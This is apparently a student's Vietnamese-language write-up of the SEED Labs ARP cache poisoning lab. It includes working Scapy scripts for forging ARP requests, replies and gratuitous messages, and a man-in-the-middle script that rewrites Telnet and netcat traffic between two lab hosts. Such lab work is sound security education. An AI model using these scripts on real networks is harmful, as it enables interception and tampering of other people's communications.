ARP Cache Poisoning Attack
===

Link: https://seedsecuritylabs.org/Labs_20.04/Networking/ARP_Attack/

---
## Mục lục <a name="menu"></a>

* [Mục lục](#menu)
* [Intro](#intro)
* [Task 1: ARP Cache Poisoning](#t1)
    * [Task 1.A: Sử dụng ARP request](#t1.a)
    * [Task 1.B: Sử dụng ARP reply](#t1.b)
    * [Task 1.C: Sử dụng Gratuitous message](#t1.c)
* [Task 2: MITM Attack on Telnet using ARP Cache Poisoning](#t2)
* [Task 3: MITM Attack on Netcat using ARP Cache Poisoning](#t3)
* [References](#ref)

---
## Intro <a name="intro"></a>

SEED Lab - ARP Attack là 1 project hướng dẫn các cách tấn công dựa trên giao thức ARP ở tầng datalink trong mô hình mạng. ARP là 1 giao thức giao tiếp được sử dụng trong mạng nội bộ có chức năng định vị địa chỉ IP của thiết bị trong mạng dựa vào MAC address của chúng. Ở lab này, chúng ta sẽ được học 2 kiểu tấn công cơ bản và phổ biến dựa vào giao thức ARP là ARP Cache Poisoning và Man in The Middle attack wih ARP Cache Poisoning.


## Task 1: ARP Cache Poisoning <a name="t1"></a>

Đến với task đầu tiên, chúng ta sẽ thử nghiệm ARP Cache Poisoning ở mức cơ bản bằng 3 phương thức khác nhau:
* Sử dụng ARP request
* Sử dụng ARP reply
* Sử dụng ARP gratuitous messages

Chúng ta sẽ tiến hành phân vai trò các máy trong mô hình thử nghiệm như sau:

* **Host A**: Target - đây sẽ là host mà chúng ta muốn làm thay đổi ARP cache của nó
* **Host B**: Victim - đây là host bị giả mạo trong bảng ARP của target
* **Host M**: Attacker - đây là host sẽ tiến hành inject thông tin sai lệch vào cho target

Công việc cụ thể của host M là sẽ gửi gói tin ARP giả tự tạo đến cho A khiến A cập nhật ARP cache của mình, gán MAC address của M cho entry B trong ARP table của A, tức là IP của victim (B) nhưng MAC address lại là của M.

---
### Task 1.A: Sử dụng ARP request <a name="t1.a"></a>

Đầu tiên, chúng ta tiến hành ping qua lại giữa 2 máy host A-B để tạo bảng ARP trên chúng với các entry hợp lệ:

Host A 
![](https://i.imgur.com/WXPkyKD.png)

Host B:
![](https://i.imgur.com/j4A0l4D.png)

Sau khi đã tạo ARP table, chúng ta sẽ code và chạy đoạn mã sau để tạo 1 ARP request giả gửi từ M tới A nhằm cập nhật giá trị MAC address của Host B trong ARP table của A:

```python=
#!/usr/bin/env python3
from scapy.all import *

attackerMAC = "02:42:0a:09:00:69"
targetMAC = "02:42:0a:09:00:05"
targetIP = "10.9.0.5"
victimIP = "10.9.0.6"

eth = Ether()
arp = ARP()

eth.src = attackerMAC 
eth.dst = targetMAC

arp.op = 1 #op = 1 for arp request, op = 2 for arp reply
arp.psrc = victimIP
arp.hwsrc = attackerMAC
arp.pdst = targetIP

packet = eth/arp

sendp(packet)

```

Đoạn code trên sẽ tạo 2 header Ethernet và ARP, tiếp theo tiến hành gán các trường cần thiết, cuối cùng là ghép gói và gửi đi:

- **eth.src**: MAC address của attacker mà ta muốn inject vào ARP cache của target
- **eth.dst:** MAC address của target, đích đến của gói tin
- **arp.op:** 1 dành cho ARP request, 2 dành cho ARP reply
- **arp.psrc**: IP của sender (gán của victim)
- **arp.hwsrc:** MAC address của sender (gán của attacker)
- **arp.pdst:** IP của receiver (gán của target)

Phân tích đoạn code trên, chúng ta thấy IP sender được gán là  IP của Victim để attacker giả mạo Victim gửi gói tin trong khi đó MAC address của sender lại không phải của Victim mà là của attacker, điều này sẽ khiến receiver (target) cập nhật lại ARP table của mình vì lầm tưởng rằng Victim đã thay đổi MAC address. Kết quả sau khi chạy script trên attacker, xem lại ARP table của target:

![](https://i.imgur.com/GObFTbS.png)

![](https://i.imgur.com/GtWzhpm.png)

Có thể thấy rằng chúng ta đã thành công gán MAC address của attacker vào cho IP của Victim, kết quả wireshark:

![](https://i.imgur.com/rOIyr5V.png)

![](https://i.imgur.com/976Zbms.png)

![](https://i.imgur.com/Ii7VERu.png)

---
### Task 1.B: Sử dụng ARP reply <a name="t1.b"></a>

> **Trường hợp 1: B (Victim) đã có trong ARP table của A (target)**

Tương tự task 1.A, trước hết chúng ta phải thiết lập lại ARP table ở A, sau đó, chúng ta sẽ code đoạn script sau để gửi đi gói ARP reply, trường arp.op sẽ gán = 2 để chỉ định gói tin reply:

```python=
#!/usr/bin/env python3
from scapy.all import *

attackerMAC = "02:42:0a:09:00:69"
targetMAC = "02:42:0a:09:00:05"
targetIP = "10.9.0.5"
victimIP = "10.9.0.6"

eth = Ether()
arp = ARP()

eth.src = attackerMAC 
eth.dst = targetMAC

arp.op = 2 #op = 1 for arp request, op = 2 for arp reply
arp.psrc = victimIP
arp.hwsrc = attackerMAC
arp.pdst = targetIP
arp.hwdst = targetMAC

packet = eth/arp

sendp(packet)
```

![](https://i.imgur.com/L3h70E5.png)

Before:
![](https://i.imgur.com/83skXvq.png)

After:
![](https://i.imgur.com/6fFh6j2.png)

Thành công thay đổi ARP cache tại host A với vai trò là target. Chúng ta sẽ quan sát kết quả của wireshark:

![](https://i.imgur.com/CN1ZVaW.png)

Gói tin 5,6 chính là gói tin được host A gửi đi khi ping tới B, gói 7 là do attacker gửi tới A để thay đổi ARP cache:

![](https://i.imgur.com/jSWqMXs.png)

> **Trường hợp 2: B (victim) chưa có trong ARP table của A (target)**

Đối với trường hợp này, chúng ta sẽ xóa mục B trong ARP table của A trước, sau đó tiến hành gửi gói tin giả như ở trường hợp 1, lưu ý rằng đoạn script vẫn không thay đổi:

![](https://i.imgur.com/Nbk50dY.png)

![](https://i.imgur.com/4PIYdwO.png)

![](https://i.imgur.com/LWzKt3k.png)

> *Kết quả cho thấy không có mục cho host B được thêm vào ARP table của A, việc spoofing thất bại.*

Quan sát kết quả wireshark:

![](https://i.imgur.com/ZeHrrHY.png)

Gói thứ 8 chính là gói reply spoofing, tuy nó được gửi đi thành công nhưng lại không thay đổi được ARP cache ở host A. Đối với ARP reply, spoofing chỉ thành công khi trong ARP table đã có host B hoặc reply này là 1 response cho 1 request của host A. Lí do là vì host A không xác định được nguồn gốc của gói tin, nếu không có request từ host B hoặc không có mục B trong ARP table thì host A sẽ không biết host B là ai? có tồn tại không hay là gói tin giả hoặc sai lệch? Do vậy, host A sẽ loại bỏ các gói tin không rõ nguồn gốc

---
### Task 1.C: Sử dụng Gratuitous message <a name="t1.c"></a>

Trước hết, gratuitous message là 1 loại ARP response, nó được tạo từ 1 node hoặc gateway và gửi đi cho toàn mạng (broadcasting). Loại ARP message này không cần yêu cầu ARP request tương ứng và được sử dụng với 3 mục đích là cập nhật ARP table cho các node, thông báo sự tồn tại của 1 node, loại bỏ các IP trùng lặp

Để thực hiện Cache poisoning với ARP gratuitous, chúng ta compile và chạy đoạn code sau ở máy attacker:

```python=
#!/usr/bin/env python3
from scapy.all import *

attackerMAC = "02:42:0a:09:00:69"
targetIP = "10.9.0.5"
victimIP = "10.9.0.6"

eth = Ether()
arp = ARP()

eth.src = attackerMAC 
eth.dst = "ff:ff:ff:ff:ff:ff"

arp.op = 2 #op = 1 for arp request, op = 2 for arp reply
arp.psrc = victimIP
arp.hwsrc = attackerMAC
arp.pdst = victimIP
arp.hwdst = "ff:ff:ff:ff:ff:ff"

packet = eth/arp

sendp(packet)

```

Nhìn chung thì không có gì khác biệt với đoạn code ở task 1.B, chỉ có 1 số thay đổi như sau: trường op gán bằng 2 vì nó cũng là loại reply, trường IP sender và IP receiver sẽ giống nhau để chỉ ra ai là người đã tạo gói tin này, chỗ final destination của gói tin là broadcast chứ không phải host nào cụ thể.

> **Trường hợp 1: B (Victim) đã có trong ARP table của A (target)**

Tiến hành chạy đoạn script:

![](https://i.imgur.com/Hx28zBq.png)

Before:
![](https://i.imgur.com/aP856iM.png)

After:
![](https://i.imgur.com/8sCHs9V.png)

Thành công spoofing gói tin ARP gratuitous và cập nhật lại ARP table của host A, thay đổi được trường MAC address thành của attacker. Ở trường hợp này, chúng ta đang sử dụng ARP gratuitous như để update ARP table của tất cả các node trong mạng, giống như việc nói cho tất cả rằng Host B (victim) đã thay đổi MAC address thành **02:42:0a:09:00:69** (tức MAC address của attacker). Quan sát wireshark, ta thấy gói tin thứ 17 là gói tin ARP gratuitous spoofing:

![](https://i.imgur.com/dV3Jh1y.png)

![](https://i.imgur.com/pyN0hxK.png)

> **Trường hợp 2: B (Victim) chưa có trong ARP table của A (target)**

Tiến hành reset lại ARP table ở A và chạy lại đoạn script:

![](https://i.imgur.com/HSzIWdG.png)

![](https://i.imgur.com/xy3PmTi.png)

![](https://i.imgur.com/LsBIFEI.png)

> *Kết quả là spoofing thất bại, lí do tương tự trường hợp 2 của task 1.B, vì nếu chưa có thông tin gì về host B thì làm sao host A có thể nhận diện gói tin hay update ARP table được*

---
## Task 2: MITM Attack on Telnet using ARP Cache Poisoning <a name="t2"></a>

Ở task này, chúng ta sẽ thực hiện ARP Cache Poisoning ở cả 2 host A và B, khi đó cả 2 đều có MAC address của M nên khi gói tin truyền giữa A - B thông qua telnet sẽ đi qua M, đây là 1 loại tấn công phổ biến với tên gọi là Man In The Middle.

> **Step 1: ARP Cache Poisoning host A, B**

Chúng ta sẽ chạy file script sau để poison 2 host 1 lúc và định thời 4 giây sẽ gửi spoof package 1 lần:


Kết quả poison 2 host thành công:

![](https://i.imgur.com/GBCKhWz.png)


> **Step 2: Testing**

Tiếp theo, chúng ta sẽ thử ping giữa 2 host A và B sau khi đã thay đổi ARP table của cả 2, cần tắt IP forwarding ở host M trước:

![](https://i.imgur.com/Jg7wR9z.png)

![](https://i.imgur.com/p7fvgoo.png)

Có thể thấy, khi 1 host ping tới host còn lại thì chưa nhận ngay phản hồi mà 1 lúc sau mới thấy có echo reply là bởi vì lúc đầu gói tin echo request được gửi tới attacker nhưng do attacker không response nên sẽ xảy ra lỗi response not found. Sau đó, giao thức ARP ở host sẽ đi hỏi toàn mạng để truy vấn MAC address của host đích gói tin, sau khi hỏi xong thì gói tin mới đến được đích đúng chứ không thông qua attacker nữa. Quan sát kết quả wireshark:

![](https://i.imgur.com/paK3wPE.png)

Do cache đang bị sai nên gói tin gửi tới cho attacker, sau khi hỏi lại (broadcast) thì host biết đích đến nên kết quả xuất hiện echo reply:

![](https://i.imgur.com/gEW6NV8.png)

> **Step 3: Turn on IP forwarding**

Với step này, chúng ta sẽ bật lại IP forwarding và tiến hành ping và dùng wireshark để quan sát kết quả:

Ping
![](https://i.imgur.com/ceKULH7.png)

Wireshark
![](https://i.imgur.com/8c9fpFa.png)

Lần này ping hoàn toàn thành công, không bị no response nữa, lí do là vì attacker đã bật IP forwarding để chuyển hướng gói tin từ A sang B và ngược lại, xem ARP table của attacker sẽ rõ lí do:

![](https://i.imgur.com/n0CTOK9.png)

> **Step 4: Launch the MITM attack**

Để bắt đầu step này, chúng ta sẽ dùng host A kết nối telnet tới host B trong khi host B dùng nc để lắng nghe, sau đó tắt IP forwarding trên attacker để tiến hành intercept (nếu để IP forwarding off từ lúc đầu thì sẽ không kết nối telnet giữa A và B được):

![](https://i.imgur.com/EiZkyza.png)

![](https://i.imgur.com/audgCQ0.png)

Sau khi dùng host A kết nối thành công tới host B, chúng ta đã có thể gửi text qua lại, lúc đầu nhập vẫn bình thường, tuy nhiên, 1 khi chúng ta tắt IP forwarding đi thì nhập dữ liệu sẽ không ăn thua, không hiển thị bất cứ gì lên nữa vì dữ liệu nhập vào ở host A không đến được host B nên nó không echo back lại và hiển thị lên cho chúng ta xem được(cơ chế hoạt động của telnet).

![](https://i.imgur.com/UAzolzH.png)

![](https://i.imgur.com/fjWQuET.png)

Đây chính là mục đích của chúng ta, để intercept quá trình giao tiếp từ A tới B, chúng ta cần chặn mọi thứ A gửi, sửa nó và gửi tới B, chạy đoạn script sau để tiến hành intercept, lưu ý là cần phải sniff gói tin xong rồi mới modify được:

```python=
#!/usr/bin/env python3
from scapy.all import *
import re

IP_A = "10.9.0.5"
IP_B = "10.9.0.6"
MAC_A = "02:42:0a:09:00:05"
MAC_B = "02:42:0a:09:00:06"

def intercept(pkt):
	if pkt[IP].src == IP_A and pkt[IP].dst == IP_B and pkt[TCP].payload:
		newpkt = IP(bytes(pkt[IP]))
		del(newpkt.chksum)
		del(newpkt[TCP].payload)
		del(newpkt[TCP].chksum)
		
		olddata = pkt[TCP].payload.load
		data = olddata.decode()
		newdata = re.sub(r'[a-zA-Z]',r'Z',data)
		
		send(newpkt/newdata)

	elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
		send(pkt[IP])

pkt = sniff(iface='eth0', filter='tcp', prn=intercept)

```

Đoạn code trên sẽ sniff gói tin rồi xét 2 trường TCP.src và TCP.dst để xác nhận gói tin đi theo chiều nào, nếu từ A -> B thì sẽ thực hiện xóa checksum và thay đổi data (phải xóa checksum đi vì khi modify gói tin, checksum cũ sẽ bị sai). Ngược lại, nếu gói tin từ B -> A thì không sửa đổi gì cả mà chỉ đơn giản là forwarding gói tin cho A. Chỗ gán olddata và tạo newdata sẽ thay đổi mỗi kí tự host A nhập vào thành chữu "Z". Chạy thử script trên attacker và test bằng cách gửi dữ liệu từ A qua B để xem dữ liệu có bị thay đổi thành "Z" không:

![](https://i.imgur.com/LcvvnGf.png)

Có thể quan sát 2 dòng cuối từ A gửi sang B là "aaaa" và "tttt" nhưng đều bị đổi thành "ZZZZ", tuy nhiên từ B gửi lại sang A thì sẽ không thay đổi

> *Vậy là chúng ta đã thành công thực hiện cuộc tấn công Man in The Middle giữa 2 host A và B, sniff gói tin và intercept thay đổi nội dung rồi gửi lại cho nạn nhân thông điệp đã bị sửa.*

---
## Task 3: MITM Attack on Netcat using ARP Cache Poisoning <a name="t3"></a>

Ở task này, chúng ta thực hiện tương tự task trên nhưng có điều lần này 2 host A và B sẽ tương tác với nhau qua netcat, đầu tiên, chúng ta bật IP forwarding trên host attacker rồi sau đó kết nối 2 host A, B bằng netcat:

![](https://i.imgur.com/K5CWCtz.png)

Test thử thành công, giờ chúng ta sẽ tắt IP forwarding và chạy script MITM ở task 2:

![](https://i.imgur.com/EoVPJ0w.png)

Gõ bất kì để attacker sniff gói và intercept

![](https://i.imgur.com/KfVcgCE.png)

> *Thành công thực hiện cuộc tấn công MITM giữa 2 host A, B thông qua netcat, lần này kết quả trả về mượt hơn và ít lỗi gói hơn là vì cơ chế hoạt động của netcat là gửi 1 dòng text qua TCP đến server và hiển thị luôn trong khi telnet gửi từng kí tự đến server và đợi server echo back lại kí tự đó mới hiển thị lên được màn hình host A.*

---
## References <a name="ref"></a>

SEED lab pdf: https://seedsecuritylabs.org/Labs_20.04/Files/ARP_Attack/ARP_Attack.pdf

Scapy documents: https://scapy.readthedocs.io/en/latest/

About Gratuitous ARP message: https://www.practicalnetworking.net/series/arp/gratuitous-arp/
